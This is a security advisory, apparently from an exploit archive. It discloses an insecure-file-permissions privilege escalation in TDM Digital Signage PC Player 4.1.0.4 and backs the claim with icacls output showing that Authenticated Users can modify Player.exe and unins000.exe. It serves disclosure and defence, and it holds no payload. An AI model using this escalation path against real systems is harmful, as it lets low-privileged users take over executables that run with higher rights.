@@ -1,0 +1,62 @@
+# Exploit Title: TDM Digital Signage PC Player 4.1 - Insecure File Permissions
+# Date: 2020-09-23
+# Exploit Author: LiquidWorm
+# Software Link: https://www.tdmsignage.com / https://pro.sony/en_NL/products/display-software/tdm-ds1y-tdm-ds3y
+# Version: 4.1.0.4
+
+Vendor: TDM [Trending Digital Marketing]
+Product web page: https://www.tdmsignage.com
+                  https://pro.sony/en_NL/products/display-software/tdm-ds1y-tdm-ds3y
+Affected version: 4.1.0.4
+
+Summary: With TDM you can do a lot more than just show Digital Signage.
+With our Enterprise-Grade software you open the door to Interactive Signage,
+Analytics, Proof of Play and a lot more.
+
+Desc: TDM Digital Signage Windows Player suffers from an elevation of
+privileges vulnerability which can be used by a simple authenticated
+user that can change the executable file with a binary of choice. The
+vulnerability exist due to the improper permissions, with the 'M' flag
+(Modify) or 'C' flag (Change) for 'Authenticated Users' group.
+
+Tested on: Microsoft Windows 10 Home
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5604
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5604.php
+
+23.09.2020
+
+--
+
+
+C:\>icacls TDMSignage
+TDMSignage BUILTIN\Administrators:(I)(OI)(CI)(F)
+           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+           BUILTIN\Users:(I)(OI)(CI)(RX)
+           NT AUTHORITY\Authenticated Users:(I)(M)              <---------<<<
+           NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)  <---------<<<
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\TDMSignage>dir /b *.exe
+Player.exe
+unins000.exe
+
+C:\TDMSignage>icacls Player.exe && icacls unins000.exe
+Player.exe BUILTIN\Administrators:(I)(F)
+           NT AUTHORITY\SYSTEM:(I)(F)
+           BUILTIN\Users:(I)(RX)
+           NT AUTHORITY\Authenticated Users:(I)(M)              <---------<<<
+
+Successfully processed 1 files; Failed processing 0 files
+unins000.exe BUILTIN\Administrators:(I)(F)
+             NT AUTHORITY\SYSTEM:(I)(F)
+             BUILTIN\Users:(I)(RX)
+             NT AUTHORITY\Authenticated Users:(I)(M)            <---------<<<
+
+Successfully processed 1 files; Failed processing 0 files
